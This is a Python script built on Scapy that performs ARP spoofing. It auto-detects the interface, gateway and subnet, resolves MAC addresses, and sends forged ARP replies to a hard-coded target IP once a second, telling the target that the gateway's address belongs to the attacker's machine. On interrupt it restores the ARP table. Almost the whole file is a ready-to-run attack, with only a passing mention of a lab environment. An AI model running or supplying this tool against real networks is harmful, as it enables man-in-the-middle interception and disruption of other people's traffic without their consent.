from scapy.all import ARP, Ether, sendp, getmacbyip, conf, get_if_addr
import time
import sys
import ipaddress
import subprocess
import re

# ─── Configuration ───────────────────────────────────────────────
TARGET_IP = "172.17.188.246"
GATEWAY_IP = None               # None = auto-detect default gateway
INTERFACE = None                 # None = auto-detect active interface
# ─────────────────────────────────────────────────────────────────


def get_default_gateway():
    """Get the default gateway IP from system routing table."""
    try:
        out = subprocess.check_output(["route", "-n", "get", "default"],
                                      stderr=subprocess.DEVNULL, text=True)
        match = re.search(r"gateway:\s+([\d.]+)", out)
        if match:
            return match.group(1)
    except Exception:
        pass
    try:
        out = subprocess.check_output(["ip", "route"], stderr=subprocess.DEVNULL, text=True)
        match = re.search(r"default via ([\d.]+)", out)
        if match:
            return match.group(1)
    except Exception:
        pass
    return None


def get_local_netmask(iface):
    """Get the subnet mask for a given interface (macOS / Linux)."""
    try:
        out = subprocess.check_output(["ifconfig", iface],
                                      stderr=subprocess.DEVNULL, text=True)
        match = re.search(r"netmask\s+(0x[0-9a-fA-F]+)", out)
        if match:
            mask_int = int(match.group(1), 16)
            return str(ipaddress.IPv4Address(mask_int))
        match = re.search(r"netmask\s+([\d.]+)", out)
        if match:
            return match.group(1)
    except Exception:
        pass
    return "255.255.255.0"


def check_same_subnet(local_ip, target_ip, netmask):
    """Return True if target_ip is in the same subnet as local_ip."""
    try:
        local_net = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
        return ipaddress.IPv4Address(target_ip) in local_net
    except ValueError:
        return False


print("[*] ARP Spoof Script")
print("[*] Detecting network environment...\n")

iface = INTERFACE or conf.iface
local_ip = get_if_addr(iface)
gateway_ip = GATEWAY_IP or get_default_gateway()
netmask = get_local_netmask(iface)
local_net = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)

print(f"    Interface : {iface}")
print(f"    Local IP  : {local_ip}")
print(f"    Subnet    : {local_net} ({local_net.network_address} ~ {local_net.broadcast_address})")
print(f"    Gateway   : {gateway_ip}")
print(f"    Target    : {TARGET_IP}")
print()

# ─── Subnet Check ────────────────────────────────────────────────
if not check_same_subnet(local_ip, TARGET_IP, netmask):
    target_net = ipaddress.IPv4Network(f"{TARGET_IP}/{netmask}", strict=False)
    print("[!] ══════════════════════════════════════════════════════════")
    print("[!]  SUBNET MISMATCH — Target is NOT in the same subnet!")
    print("[!] ══════════════════════════════════════════════════════════")
    print(f"[!]  Your subnet  : {local_net}")
    print(f"[!]  Target subnet: {target_net} (estimated)")
    print("[!]")
    print("[!]  ARP is a Layer-2 protocol and CANNOT cross subnet/VLAN")
    print("[!]  boundaries. The attack will have no effect.")
    print("[!]")
    print("[!]  Possible solutions:")
    print("[!]    1. Connect both devices to the same network/SSID/VLAN")
    print("[!]    2. Create a personal hotspot and connect both devices")
    print("[!]    3. Use a portable router for a controlled lab environment")
    print("[!] ══════════════════════════════════════════════════════════")
    print()
    resp = input("[?] Continue anyway? (y/N): ").strip().lower()
    if resp != "y":
        print("[*] Aborted.")
        sys.exit(0)
    print()

if not gateway_ip:
    print("[!] Could not detect default gateway. Set GATEWAY_IP manually.")
    sys.exit(1)

# ─── Resolve MAC Addresses ───────────────────────────────────────
print("[*] Resolving MAC addresses...")
target_mac = getmacbyip(TARGET_IP)
gateway_mac = getmacbyip(gateway_ip)

if not target_mac:
    print("[!] Could not resolve target MAC. Is the target device connected?")
    sys.exit(1)
if not gateway_mac:
    print("[!] Could not resolve gateway MAC.")
    sys.exit(1)

print(f"[*] Target MAC  : {target_mac}")
print(f"[*] Gateway MAC : {gateway_mac}")
print("[*] Starting ARP spoofing... Press Ctrl+C to stop.\n")

# Tells the target that the gateway's IP is at OUR MAC address (unicast only)
poison_pkt = Ether(dst=target_mac) / ARP(
    op="is-at",
    psrc=gateway_ip,
    pdst=TARGET_IP,
    hwdst=target_mac
)

try:
    count = 0
    while True:
        sendp(poison_pkt, iface=iface, verbose=False)
        count += 1
        print(f"\r[*] Sent {count} spoofed ARP packets...", end="", flush=True)
        time.sleep(1)
except KeyboardInterrupt:
    print(f"\n\n[*] Stopping attack. Restoring ARP table...")
    restore_pkt = Ether(dst=target_mac) / ARP(
        op="is-at",
        psrc=gateway_ip,
        hwsrc=gateway_mac,
        pdst=TARGET_IP,
        hwdst=target_mac
    )
    for _ in range(5):
        sendp(restore_pkt, iface=iface, verbose=False)
        time.sleep(0.5)
    print("[*] ARP table restored. Target should be back online.")
